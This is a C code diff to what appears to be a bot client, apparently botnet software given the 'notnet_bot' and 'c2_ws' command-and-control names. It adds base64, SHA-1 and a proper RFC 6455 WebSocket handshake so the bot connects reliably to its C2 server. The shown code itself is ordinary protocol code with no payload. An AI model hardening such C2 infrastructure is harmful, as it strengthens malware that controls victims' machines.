@@ -843,6 +843,100 @@ void http_disconnect(notnet_bot_t *bot) {
 }
 
 /* ── WebSocket Implementation ─────────────────────────────────────── */
+/* ── WebSocket RFC 6455 Handshake Helpers ────────────────────── */
+
+/* Minimal base64 encoder (RFC 4648). dst must hold >= 4*((len+2)/3)+1 bytes. */
+static void ws_base64_encode(const uint8_t *src, int len, char *dst, int dst_size) {
+    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int i = 0, o = 0;
+    while (i < len && o < dst_size - 4) {
+        uint32_t a = src[i], b = (i + 1 < len) ? src[i + 1] : 0, c = (i + 2 < len) ? src[i + 2] : 0;
+        uint32_t t = (a << 16) | (b << 8) | c;
+        dst[o++] = tbl[(t >> 18) & 0x3F];
+        dst[o++] = tbl[(t >> 12) & 0x3F];
+        dst[o++] = (i + 1 < len) ? tbl[(t >> 6) & 0x3F] : '=';
+        dst[o++] = (i + 2 < len) ? tbl[t & 0x3F] : '=';
+        i += 3;
+    }
+    dst[o] = '\0';
+}
+
+/* SHA-1 (FIPS 180-1) — compact single-shot implementation for the
+ * RFC 6455 Sec-WebSocket-Accept computation. */
+typedef struct { uint32_t h[5]; uint64_t len; uint8_t buf[64]; size_t buflen; } ws_sha1_ctx;
+
+static uint32_t ws_rotl(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }
+
+static void ws_sha1_init(ws_sha1_ctx *c) {
+    c->h[0] = 0x67452301; c->h[1] = 0xEFCDAB89; c->h[2] = 0x98BADCFE;
+    c->h[3] = 0x10325476; c->h[4] = 0xC3D2E1F0; c->len = 0; c->buflen = 0;
+}
+
+static void ws_sha1_block(ws_sha1_ctx *c, const uint8_t *p) {
+    uint32_t w[80];
+    for (int i = 0; i < 16; i++) {
+        w[i] = ((uint32_t)p[i * 4] << 24) | ((uint32_t)p[i * 4 + 1] << 16) |
+               ((uint32_t)p[i * 4 + 2] << 8) | p[i * 4 + 3];
+    }
+    for (int i = 16; i < 80; i++) {
+        w[i] = ws_rotl(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1);
+    }
+    uint32_t a = c->h[0], b = c->h[1], cc = c->h[2], d = c->h[3], e = c->h[4];
+    for (int i = 0; i < 80; i++) {
+        uint32_t f, k;
+        if (i < 20)      { f = (b & cc) | ((~b) & d); k = 0x5A827999; }
+        else if (i < 40) { f = b ^ cc ^ d;            k = 0x6ED9EBA1; }
+        else if (i < 60) { f = (b & cc) | (b & d) | (cc & d); k = 0x8F1BBCDC; }
+        else             { f = b ^ cc ^ d;            k = 0xCA62C1D6; }
+        uint32_t tmp = ws_rotl(a, 5) + f + e + k + w[i];
+        e = d; d = cc; cc = ws_rotl(b, 30); b = a; a = tmp;
+    }
+    c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d; c->h[4] += e;
+}
+
+static void ws_sha1_update(ws_sha1_ctx *c, const uint8_t *data, size_t len) {
+    c->len += len;
+    while (len > 0) {
+        size_t take = 64 - c->buflen;
+        if (take > len) take = len;
+        memcpy(c->buf + c->buflen, data, take);
+        c->buflen += take;
+        data += take;
+        len -= take;
+        if (c->buflen == 64) { ws_sha1_block(c, c->buf); c->buflen = 0; }
+    }
+}
+
+static void ws_sha1_final(ws_sha1_ctx *c, uint8_t out[20]) {
+    uint64_t bits = c->len * 8;
+    uint8_t pad = 0x80;
+    ws_sha1_update(c, &pad, 1);
+    uint8_t zero = 0;
+    while (c->buflen != 56) ws_sha1_update(c, &zero, 1);
+    uint8_t lenb[8];
+    for (int i = 0; i < 8; i++) lenb[i] = (bits >> (56 - i * 8)) & 0xFF;
+    ws_sha1_update(c, lenb, 8);
+    for (int i = 0; i < 5; i++) {
+        out[i * 4]     = (c->h[i] >> 24) & 0xFF;
+        out[i * 4 + 1] = (c->h[i] >> 16) & 0xFF;
+        out[i * 4 + 2] = (c->h[i] >> 8) & 0xFF;
+        out[i * 4 + 3] = c->h[i] & 0xFF;
+    }
+}
+
+/* Compute base64(SHA1(key + RFC6455_GUID)) — the Sec-WebSocket-Accept
+ * the server must echo for our handshake key. */
+static void ws_compute_accept(const char *key, char *out, int out_size) {
+    static const char GUID[] = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
+    ws_sha1_ctx c;
+    ws_sha1_init(&c);
+    ws_sha1_update(&c, (const uint8_t *)key, strlen(key));
+    ws_sha1_update(&c, (const uint8_t *)GUID, strlen(GUID));
+    uint8_t digest[20];
+    ws_sha1_final(&c, digest);
+    ws_base64_encode(digest, 20, out, out_size);
+}
+
 int ws_connect(notnet_bot_t *bot) {
     if (bot->c2_ws.connected) return 0;
     
@@ -903,16 +997,25 @@ int ws_connect(notnet_bot_t *bot) {
         return -1;
     }
     
-    /* SECURITY FIX (#46): Send WebSocket upgrade request per RFC 6455.
+    /* SECURITY FIX (#46): Perform the RFC 6455 client handshake.
      * Raw TCP connect is not enough — the server must respond with
-     * HTTP 101 Switching Protocols. Without the handshake the bot
-     * would be talking on raw frames to a non-upgraded connection. */
-    char ws_key[24];
-    random_string(ws_key, sizeof(ws_key));
-    
+     * HTTP 101 Switching Protocols and a valid Sec-WebSocket-Accept
+     * (base64(SHA1(key + GUID))). Without the handshake a real
+     * WebSocket endpoint rejects the masked frames ws_send() emits. */
+
+    /* Sec-WebSocket-Key: base64 of 16 cryptographically-random bytes */
+    uint8_t key_raw[16];
+    if (random_bytes(key_raw, sizeof(key_raw)) != 0) {
+        log_warn("WS: getrandom failed for handshake key");
+        close(sock);
+        return -1;
+    }
+    char ws_key[32];
+    ws_base64_encode(key_raw, sizeof(key_raw), ws_key, sizeof(ws_key));
+
     char upgrade_req[2048];
-    snprintf(upgrade_req, sizeof(upgrade_req),
-             "GET /%s HTTP/1.1\r\n"
+    int req_len = snprintf(upgrade_req, sizeof(upgrade_req),
+             "GET %s HTTP/1.1\r\n"
              "Host: %s:%d\r\n"
              "Upgrade: websocket\r\n"
              "Connection: Upgrade\r\n"
@@ -920,10 +1023,20 @@ int ws_connect(notnet_bot_t *bot) {
              "Sec-WebSocket-Version: 13\r\n"
              "\r\n",
              bot->c2_ws.path, bot->c2_ws.server, bot->c2_ws.port, ws_key);
-    
-    send(sock, upgrade_req, strlen(upgrade_req), 0);
-    
-    /* Read 101 response (non-blocking) */
+    if (req_len < 0 || req_len >= (int)sizeof(upgrade_req)) {
+        log_warn("WS: upgrade request too large");
+        close(sock);
+        return -1;
+    }
+
+    int sent = send(sock, upgrade_req, req_len, 0);
+    if (sent != req_len) {
+        log_warn("WS: upgrade request send failed: %s", strerror(errno));
+        close(sock);
+        return -1;
+    }
+
+    /* Read the 101 response headers (5s timeout, bounded loop). */
     char response[1024] = {0};
     int received = 0;
     while (received < (int)sizeof(response) - 1) {
@@ -931,26 +1044,62 @@ int ws_connect(notnet_bot_t *bot) {
         struct timeval tv;
         FD_ZERO(&rfd);
         FD_SET(sock, &rfd);
-        tv.tv_sec = 1;
+        tv.tv_sec = 5;
         tv.tv_usec = 0;
         if (select(sock + 1, &rfd, NULL, NULL, &tv) <= 0) {
-            log_warn("WS: upgrade request timed out");
+            log_warn("WS: upgrade response timed out");
             close(sock);
             return -1;
         }
         int r = recv(sock, response + received, sizeof(response) - received - 1, 0);
         if (r <= 0) break;
         received += r;
+        response[received] = '\0';
+        /* Stop once the header terminator arrives */
+        if (strstr(response, "\r\n\r\n")) break;
     }
     response[received] = '\0';
-    
-    /* Check for 101 Switching Protocols */
-    if (!strstr(response, "101")) {
-        log_warn("WS: no 101 response received — handshake failed");
+
+    /* Verify the status line is exactly "HTTP/1.1 101" (start-of-line match,
+     * not a substring scan that could match "101" inside an error body). */
+    if (strncmp(response, "HTTP/1.1 101", 12) != 0 &&
+        strncmp(response, "HTTP/1.0 101", 12) != 0) {
+        log_warn("WS: no 101 Switching Protocols received — handshake failed (%.80s)",
+                 response[0] ? response : "(empty response)");
         close(sock);
         return -1;
     }
-    
+
+    /* Verify Sec-WebSocket-Accept header matches base64(SHA1(key+GUID)) */
+    char expect[64];
+    ws_compute_accept(ws_key, expect, sizeof(expect));
+    char *accept_hdr = strstr(response, "Sec-WebSocket-Accept:");
+    int accept_ok = 0;
+    if (accept_hdr) {
+        char *val = accept_hdr + strlen("Sec-WebSocket-Accept:");
+        while (*val == ' ' || *val == '\t') val++;
+        char got[64];
+        int i = 0;
+        while (val[i] && val[i] != '\r' && val[i] != '\n' && i < (int)sizeof(got) - 1) {
+            got[i] = val[i];
+            i++;
+        }
+        got[i] = '\0';
+        if (strcmp(got, expect) == 0) {
+            accept_ok = 1;
+        } else {
+            log_warn("WS: Sec-WebSocket-Accept mismatch (got '%s', expected '%s')",
+                     got, expect);
+        }
+    } else {
+        log_warn("WS: missing Sec-WebSocket-Accept header");
+    }
+    if (!accept_ok) {
+        close(sock);
+        return -1;
+    }
+    log_info("WS: RFC 6455 handshake complete (%s)", expect);
+
     fcntl(sock, F_SETFL, flags);
     
     bot->c2_ws.sock = sock;
